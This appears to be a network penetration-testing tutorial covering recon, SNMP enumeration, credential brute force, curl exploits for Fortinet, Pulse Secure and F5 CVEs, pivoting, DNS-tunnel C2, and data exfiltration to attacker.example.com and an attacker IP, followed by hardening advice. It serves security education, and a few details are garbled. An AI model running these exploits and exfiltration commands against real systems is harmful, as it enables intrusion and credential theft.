Network Penetration Testing Overview

Network penetration testing is the structured simulation of real-world attacks against an organisation's network infrastructure — the routers, firewalls, switches, VPN gateways, load balancers, and intrusion detection systems that form the perimeter separating internal assets from the hostile internet. While endpoint and application security receives significant investment, perimeter devices remain chronically under-tested and frequently misconfigured.

A compromised perimeter device is not a partial breach — it is a complete one. An attacker who controls a border firewall controls the traffic rules, the logging, and often has a direct path into every internal subnet behind it. Perimeter penetration testing identifies these weaknesses before adversaries do, providing organisations with the evidence needed to justify hardening investments and prioritise remediation.

[ ⚠ ]

Authorised Use Only. All techniques in this guide must be conducted under explicit written authorisation from the network owner. Network penetration testing without permission is illegal under the Computer Misuse Act, CFAA, and equivalent legislation. Always define scope, obtain written approval, and confirm rules of engagement before any active testing begins.

Understanding the Perimeter Attack Surface

Before testing begins, every device forming the network perimeter must be catalogued. Each category has distinct vulnerability classes, default credential sets, known CVEs, and exploitation techniques. A perimeter assessment that only covers firewalls while missing VPN gateways or load balancers is fundamentally incomplete — attackers do not self-restrict to comfortable targets.

01
Firewalls
Cisco ASA, Palo Alto, Fortinet FortiGate, pfSense, Check Point. Misconfigured ACLs, default credentials, outdated firmware with known CVEs (ZeroLogon, Heartbleed predecessors), and exposed web management interfaces are the primary attack vectors. Rules permitting overly broad traffic often exist due to misconfiguration or legacy exceptions.
CRITICAL TARGET
02
Routers
Cisco IOS/IOS-XE, Juniper, MikroTik, Huawei. Telnet enabled by default on legacy devices, default credentials (cisco/cisco, admin/admin), SNMP community strings set to "public", and unencrypted management access over HTTP are pervasive. Routing protocol attacks (BGP hijacking, OSPF injection) can redirect entire subnets.
CRITICAL TARGET
03
VPN Gateways
OpenVPN, IPSec/IKEv2, SSL-VPN (Pulse Secure, Fortinet, Cisco AnyConnect). SSL-VPN vulnerabilities have been massively exploited — CVE-2019-11510 (Pulse Secure) and CVE-2018-13379 (Fortinet) enabled unauthenticated file read and credential theft at scale. Weak pre-shared keys, missing MFA, and split tunnelling misconfigurations are common findings.
CRITICAL TARGET
04
IDS / IPS Systems
Snort, Suricata, Cisco FirePOWER, Palo Alto Threat Prevention. Outdated signature databases miss known threats. Management interfaces (web console, SSH) frequently run with default credentials. IPS bypass techniques — fragmentation, encoding, protocol-level obfuscation — allow attackers to conduct exploitation undetected.
HIGH TARGET
05
Load Balancers
F5 BIG-IP, Citrix ADC (NetScaler), HAProxy. F5 BIG-IP TMUI RCE (CVE-2020-5902) and Citrix ADC directory traversal (CVE-2019-19781) each allowed unauthenticated remote code execution and were exploited at massive scale within days of public disclosure. Management interfaces on non-standard ports are frequently internet-exposed.
HIGH TARGET
06
Network Management
SNMP-enabled devices exposing community strings, Syslog servers, TACACS+/RADIUS authentication servers, and network monitoring platforms. SNMP with "public" community strings provides read access to device configuration — routing tables, interface lists, and often credentials. Write-enabled SNMP can modify device configuration entirely.
HIGH TARGET

Phase I — Reconnaissance

Reconnaissance maps the external attack surface before any active probing begins. Passive reconnaissance extracts intelligence from public sources — search engines, certificate transparency logs, WHOIS records, and internet-wide scanner databases — without generating a single packet destined for the target. Active reconnaissance interacts directly with target systems to fingerprint services, identify open ports, and extract banner information. The distinction matters for operational security: passive recon is nearly invisible; active recon generates log entries on the target.

Shodan
Passive · OSINT
Internet-wide scan database — find exposed firewalls, VPN gateways, and management interfaces by product name, banner, or port without touching the target
Nmap
Active · Port Scan
Comprehensive port scanning, service version detection, OS fingerprinting, and NSE script execution against perimeter devices
Censys / FOFA
Passive · OSINT
Certificate transparency and banner scanning — identify VPN gateways, firewall management ports, and exposed services with precise version data
theHarvester
Passive · OSINT
Aggregate email addresses, subdomains, hosts, and IP ranges from public sources — maps the organisation's full external footprint
Netcat / Telnet
Active · Banner Grab
Manual banner grabbing from open service ports — reveals exact firmware versions, software builds, and sometimes usernames in service banners
Firewalk / Traceroute
Active · Firewall
Map firewall rules by sending packets with incrementing TTLs — identify which ports are permitted through the perimeter without triggering exploitation
# Passive — Shodan CLI search for exposed firewall management interfaces shodan search "Cisco ASA HTTP Configuration" shodan search "Fortinet SSL-VPN" --fields ip_str,port,org shodan host <TARGET-IP> # Active — comprehensive Nmap scan of all ports with service detection nmap -p 1-65535 -sV -sC -O -T4 --open <TARGET-IP> # Targeted scan of perimeter-relevant ports nmap -sV -p 22,23,80,161,443,500,4444,4500,8080,8443,10443 <TARGET-IP> # Banner grabbing — identify exact software version from service banner nc -v <TARGET-IP> 443 nc -v <TARGET-IP> 22 # Firewall analysis — map ACL rules using TTL manipulation traceroute <TARGET-IP> firewalk -S 1-1024 <GATEWAY-IP> <TARGET-IP> # WHOIS and DNS reconnaissance whois <TARGET-DOMAIN> dig ANY <TARGET-DOMAIN> theHarvester -d <TARGET-DOMAIN> -b all

Phase II — Scanning & Enumeration

With the attack surface mapped, scanning identifies specific vulnerabilities in discovered services. This phase moves from reconnaissance (what exists?) to vulnerability identification (what is exploitable?). Network perimeter devices are particularly productive targets for SNMP enumeration — many organisations deploy devices with default community strings that expose complete routing tables, interface configurations, and ARP caches. NSE scripts extend Nmap into a powerful vulnerability scanner for network device-specific issues.

# Run vulnerability detection scripts against perimeter devices nmap --script firewall-bypass,vuln,auth <TARGET-IP> # Check for SSL/TLS vulnerabilities — weak ciphers, POODLE, BEAST, DROWN nmap --script ssl-enum-ciphers,ssl-poodle,ssl-heartbleed -p 443,8443 <TARGET-IP> # SMB vulnerabilities on exposed network devices nmap --script smb-vuln-ms17-010,smb-security-mode -p 445 <TARGET-IP> # Check for default credentials on management interfaces nmap --script http-default-accounts,telnet-ntlm-info,ssh-auth-methods <TARGET-IP> # Web interface scanning with Nikto — management consoles on 443/8080/8443 nikto -h https://<TARGET-IP>:8443 -ssl
# Discover SNMP community strings via brute force onesixtyone -c /usr/share/wordlists/snmp_community.txt <TARGET-IP> # SNMPwalk — extract full MIB tree from a device with known community string snmpwalk -v2c -c public <TARGET-IP> # Extract specific SNMP OIDs — system info, interfaces, routing table snmpget -v2c -c public <TARGET-IP> sysDescr.0 # OS and firmware version snmpwalk -v2c -c public <TARGET-IP> ipRouteTable # Full routing table snmpwalk -v2c -c public <TARGET-IP> ifTable # All network interfaces # Automated SNMP enumeration with snmp-check snmp-check -t <TARGET-IP> -c public -v 2c # Metasploit SNMP auxiliary scanner use auxiliary/scanner/snmp/snmp_enum set RHOSTS <TARGET-IP> set COMMUNITY public run

Phase III — Exploitation of Perimeter Devices

Exploitation validates that identified vulnerabilities are genuinely exploitable — transforming theoretical risk into demonstrated business impact. Network device exploitation differs from application exploitation: the goal is rarely to execute arbitrary code (though that is possible) but more commonly to gain administrative access to the device itself, enabling traffic manipulation, configuration extraction, and network-level control. All exploitation must be conducted conservatively to avoid disrupting live services.

⟩ Default & Weak Credential Exploitation
Default credentials are the single most reliably exploited vector in network device assessments. Cisco devices historically shipped with "cisco/cisco", many SOHO routers with "admin/admin" or blank passwords, and SNMP with "public"/"private" community strings. Even organisations with mature security programmes routinely have forgotten devices — decommissioned VPN concentrators, legacy switches — still reachable with factory defaults. Hydra enables systematic credential testing across SSH, Telnet, HTTP, and SNMP simultaneously.
# SSH credential brute-force — common for routers and firewalls hydra -L /usr/share/wordlists/network_users.txt \ -P /usr/share/wordlists/network_pass.txt \ -t 4 -f ssh://<TARGET-IP> # Telnet — still common on legacy Cisco IOS devices hydra -l admin -P /usr/share/wordlists/cisco_passwords.txt \ telnet://<TARGET-IP> # VPN gateway HTTP management interface hydra -L users.txt -P pass.txt -s 8443 https-post-form://<TARGET-IP>/ # Test common default credential pairs manually for Cisco devices ssh cisco@<TARGET-IP> # Password: cisco ssh admin@<TARGET-IP> # Password: admin or blank ssh enable@<TARGET-IP> # Enable password: cisco or blank
⟩ Known CVE Exploitation — Firewall & VPN RCE
SSL-VPN vulnerabilities have been among the most impactful network security findings of the last five years. CVE-2019-11510 (Pulse Secure — unauthenticated arbitrary file read, exposing cleartext credentials) and CVE-2018-13379 (Fortinet SSL-VPN — unauthenticated path traversal exposing session files with cleartext credentials) were both exploited by nation-state actors within weeks of disclosure. F5 BIG-IP TMUI RCE (CVE-2020-5902) allowed unauthenticated remote code execution on the load balancer management interface. These vulnerabilities remain relevant in environments slow to patch.
# CVE-2018-13379 — Fortinet SSL-VPN credential file exposure (path traversal) curl -sk "https://<TARGET-IP>:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" # If vulnerable: response contains cleartext usernames and passwords # CVE-2019-11510 — Pulse Secure arbitrary file read curl -sk "https://<TARGET-IP>/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" # CVE-2020-5902 — F5 BIG-IP TMUI RCE (unauthenticated) curl -sk "https://<TARGET-IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" # Use Metasploit for automated exploitation of known CVEs search fortinet use auxiliary/scanner/http/fortios_traversal set RHOSTS <TARGET-IP> run # ALWAYS verify target is patched against known CVEs before exploitation nmap --script http-vuln-cve2020-5902 -p 443,8443 <TARGET-IP>
⟩ Firewall Rule Bypass Techniques
Firewall rule bypass exploits weaknesses in ACL design — overly permissive rules, protocol confusion, or state-table manipulation. Common techniques include source port spoofing (crafting packets from ports 20, 53, or 80 that many firewalls permit by default), ACK scanning to bypass stateless packet filters, IPv6 bypass (many firewalls with strong IPv4 rules have no IPv6 ACLs), and fragmentation attacks that split malicious content across multiple packets the IDS/IPS reassembles incorrectly.
# ACK scan — bypasses stateless packet filters (distinguishes filtered vs closed) nmap -sA -p 1-1000 <TARGET-IP> # Source port manipulation — firewalls often permit source port 53 (DNS) nmap -g 53 -sS -p 445 <TARGET-IP> # Fragment packets to evade IDS/IPS signature detection nmap -f -p 80,443 <TARGET-IP> nmap --mtu 8 -p 80 <TARGET-IP> # 8-byte MTU fragmentation # IPv6 — test if perimeter has no IPv6 ACLs when IPv4 is heavily filtered nmap -6 -sV <TARGET-IPv6-ADDRESS> # Decoy scan — hide real source IP among fake decoy IPs nmap -D RND:10 -sS -p 80,443 <TARGET-IP>

Phase IV — Privilege Escalation & Lateral Movement

Once initial access is gained on a perimeter device, the assessment pivots to demonstrate the full blast radius. Administrative access to a firewall or router provides visibility into every subnet it serves, the ability to create new firewall rules, access to VPN credential stores, and frequently direct SSH/Telnet access to internal management networks. Lateral movement through the network is often trivial once the perimeter device itself is controlled — the attacker now speaks from a position of implicit trust.

# After gaining SSH/Telnet access to a Cisco IOS device show version # IOS version, hardware model, uptime show running-config # FULL device configuration — ACLs, passwords, VPN keys show ip route # Complete routing table — maps all connected networks show ip interface brief # All interfaces and IP addresses show cdp neighbors detail # Cisco Discovery Protocol — reveals adjacent devices show arp # ARP table — live hosts on connected subnets show users # Currently logged-in users # Privilege escalation — attempt to enter enable mode enable # Enter privileged exec (try blank, 'cisco', 'enable') show running-config | include enable secret # Extract hashed enable password # Extract VPN pre-shared keys from config show running-config | include pre-shared-key show running-config | include password # Use compromised router as a pivot — set up SSH tunnel to internal hosts ssh -L 8080:10.0.0.5:80 admin@<ROUTER-IP> # Internal web server at 10.0.0.5:80 now accessible at localhost:8080 # Set up SOCKS proxy through compromised perimeter device ssh -D 1080 -N admin@<ROUTER-IP> proxychains nmap -sT 10.0.0.0/24 # Scan internal network via pivot
# If VPN credentials are extracted — connect to VPN and access internal network openvpn --config extracted_vpn.ovpn # Internal network reachable once VPN tunnel is established ip route show # Verify internal routes are pushed nmap -sV -p 22,80,443,445,3389 10.0.0.0/24 # Scan internal subnet # SSH tunnelling through compromised DMZ host to reach internal segments ssh -L 3389:10.10.10.50:3389 user@<DMZ-HOST> # RDP to internal Windows host via localhost:3389 # DNS tunnelling for C2 through restrictive firewalls using DNSCat2 # Server side (attacker controlled external DNS server): dnscat2-server <YOUR-DOMAIN> # Client side (on compromised internal host): ./dnscat2 --dns domain=<YOUR-DOMAIN> --secret <SHARED-SECRET>

Phase V — Data Exfiltration Demonstration

The exfiltration phase demonstrates the real-world impact of a perimeter compromise — what data an attacker could extract, and through which channels. Network device configurations contain extraordinarily sensitive data: firewall ACLs revealing the internal network topology, VPN pre-shared keys granting remote access, SNMP community strings providing read/write access to all managed devices, and routing tables mapping every subnet in the organisation. In a penetration test, this phase is conducted minimally and with explicit scope approval — the goal is demonstration of capability, not actual data theft.

# Extract complete device configuration via TFTP (if enabled) copy running-config tftp # On Cisco device — copies config to TFTP server # Sets up TFTP server on attacker machine: atftpd --daemon /tmp/tftp # SNMP configuration dump — no authentication needed with "public" string snmpwalk -v2c -c private <TARGET-IP> -On > full_snmp_dump.txt # DNS tunnelling exfiltration — encode data in DNS queries to bypass DPI # Using iodine to establish a full IP tunnel over DNS iodined -f -c -P secretpassword 10.99.0.1 <YOUR-DNS-DOMAIN> # HTTP data exfiltration disguised as normal web traffic # Encode sensitive data in HTTP headers or URL parameters curl -s https://attacker.example.com/beacon \ -H "X-Data: $(cat /etc/config | base64)" # SSH exfiltration — encrypted transfer through allowed outbound SSH scp config_backup.txt attacker@<ATTACKER-IP>:/exfil/

AI Integration in Network Penetration Testing

Artificial Intelligence is fundamentally reshaping both sides of the network security equation. On the offensive side, AI accelerates reconnaissance, automates vulnerability chaining, generates novel exploit variations, and enables intelligent evasion of signature-based detection. On the defensive side, AI powers anomaly detection, threat hunting, automated incident response, and predictive risk scoring. Understanding AI's role in network penetration testing — both as a tool and as an adversarial challenge — is now a core competency for modern security professionals.

This is not a distant future — AI-assisted offensive tools are deployed today by both nation-state actors and commercial red teams. Security professionals who do not understand and leverage AI capabilities are operating at a structural disadvantage against adversaries who do.

[ AI ]

AI does not replace the penetration tester — it dramatically amplifies their capabilities. Manual expertise is still required to interpret AI output, make contextual decisions, understand business risk, and conduct exploits that require real-world judgement. AI handles scale, speed, and pattern recognition; the human handles strategy, creativity, and accountability.

AI Capabilities in Offensive Network Security

🧠
Intelligent Reconnaissance
AI models analyse OSINT data at scale — correlating Shodan results, certificate transparency logs, DNS records, and dark web data to automatically build a comprehensive target profile that would take a human analyst hours or days to assemble manually.
⚡
Automated Vulnerability Chaining
AI systems can analyse discovered vulnerability sets and automatically identify multi-step attack chains — combining a credential exposure on one service with a misconfiguration on another to reach a target that neither vulnerability alone would reach.
🔀
Adaptive Payload Generation
LLM-assisted exploit development generates novel payload variations, custom encoders, and evasion-aware shellcode in response to observed defensive signatures — dramatically reducing the time from vulnerability discovery to working exploit.
🕶
Behavioural Evasion
AI models trained on EDR/IDS detection logic generate network traffic patterns and timing profiles that mimic legitimate behaviour — spreading scans across time windows, randomising packet timing, and mimicking specific application protocols to avoid detection.
🗺
Attack Path Optimisation
Graph neural networks model complex network topologies and automatically identify the shortest privilege escalation path from initial access to the highest-value target — prioritising exploitation steps by business impact and detection risk simultaneously.
📊
AI-Enhanced Reporting
LLMs process raw exploitation output — crash dumps, configuration extracts, session logs — and generate structured, risk-rated penetration test reports with technical detail and executive summaries, dramatically reducing post-engagement documentation time.

AI in Defensive Network Security

📡
Anomaly Detection at Scale
ML models trained on baseline network traffic automatically detect deviations — unusual protocol distributions, unexpected port usage, anomalous data volumes, or atypical connection timing — that signature-based IDS/IPS systems cannot identify because they have no known signature.
🔭
AI-Powered Threat Hunting
Security analysts use AI to proactively search network logs, PCAP data, and firewall rule changes for indicators of compromise — correlating events across time windows and data sources that are impossible to manually correlate at the volume modern networks generate.
🤖
Automated Incident Response
SOAR platforms enhanced with AI automatically block attacking IPs, isolate compromised network segments, revoke compromised credentials, and trigger forensic data collection in response to detected attacks — reducing mean time to contain from hours to seconds.
🔮
Predictive Risk Scoring
AI models analyse asset exposure, vulnerability age, attack trend data, and organisational context to predict which vulnerabilities are most likely to be exploited in the next attack window — enabling risk-prioritised patching that is impossible with CVSS alone.
🧬
Network Behaviour Baselining
Unsupervised ML continuously learns normal communication patterns for every device on the network — peer relationships, protocol usage, connection timing, and data volumes. Any deviation from this learned baseline triggers investigation, including zero-day lateral movement with no known IOC.
🛡
Dynamic Firewall Adaptation
AI-driven firewall systems dynamically tighten rules in response to observed attack patterns — automatically creating temporary blocks, tightening geo-restrictions, and adjusting IPS sensitivity thresholds in real time without requiring manual policy updates.

Defence — Perimeter Device Hardening

Effective perimeter hardening requires addressing every attack vector identified in this guide simultaneously. A firewall patched against known CVEs but still running with default SNMP community strings is still trivially compromised. Defence-in-depth applies at the perimeter layer just as much as anywhere else — preventive controls, detective controls, and corrective controls must all be present and operational.

Patch & Firmware Management
Maintain a documented firmware version inventory for all perimeter devices. Subscribe to vendor security advisories (Cisco PSIRT, Fortinet PSIRT, Palo Alto Unit 42). Apply Critical CVE patches within 48 hours — perimeter device CVEs are exploited faster than any other vulnerability class due to their internet exposure.
Strong Authentication
Eliminate all default credentials immediately. Enforce SSH key-based authentication for all device access — disable password authentication entirely. Implement TACACS+ or RADIUS for centralised, logged device authentication. Mandate MFA for VPN access. Remove Telnet and HTTP management access entirely — SSH and HTTPS only.
SNMP Hardening
Replace SNMPv1/v2c with SNMPv3 with authentication and privacy (AES encryption). Change all community strings from defaults. Implement ACLs restricting SNMP access to specific management station IPs only. Disable SNMP write access unless explicitly required. Consider disabling SNMP entirely and using SSH-based monitoring instead.
Disable Unnecessary Services
Apply a minimal service configuration to all perimeter devices — disable Finger, BOOTP, CDP (where not needed), proxy ARP, IP source routing, and all unused management protocols. Every enabled service is an additional attack surface. Document every enabled service with a business justification.
Network Segmentation
Isolate device management access on a dedicated out-of-band management VLAN with strict ACLs limiting access to authorised management stations only. Management traffic must never traverse the same interfaces as production traffic. Implement jump hosts for all device access — no direct management access from user subnets.
AI-Enhanced Monitoring
Deploy AI-driven network detection and response (NDR) platforms alongside traditional SIEM. AI models detect the reconnaissance, lateral movement, and exfiltration patterns that evade signature-based systems. Integrate firewall and VPN logs into a centralised SIEM with AI-powered correlation rules for anomalous authentication, unusual routing changes, and configuration modifications.
Firewall Hardening
  • Implement default-deny inbound and outbound policies — permit only explicitly required traffic
  • Enable stateful packet inspection and application-layer filtering on all interfaces
  • Log all denied connection attempts and ship to centralised SIEM for correlation
  • Conduct quarterly firewall rule reviews — remove all rules without a current business justification
VPN & Remote Access
  • Enforce Multi-Factor Authentication for all VPN access — certificates + TOTP minimum
  • Implement split tunnelling restrictions — route all traffic through VPN, not just corporate subnets
  • Monitor for impossible travel — same VPN user authenticating from multiple geographies simultaneously
  • Deploy Certificate-based client authentication — device certificates prevent credential-only compromise
AI-Powered Defence
  • Deploy NDR / AI anomaly detection (Darktrace, Vectra, ExtraHop) on all network segments
  • Integrate AI-driven SOAR for automated blocking, isolation, and forensic capture on detected attacks
  • Use AI-powered threat intelligence feeds to pre-emptively block known attacker infrastructure
  • Conduct AI-assisted red team exercises — test detection capability against AI-generated attack patterns
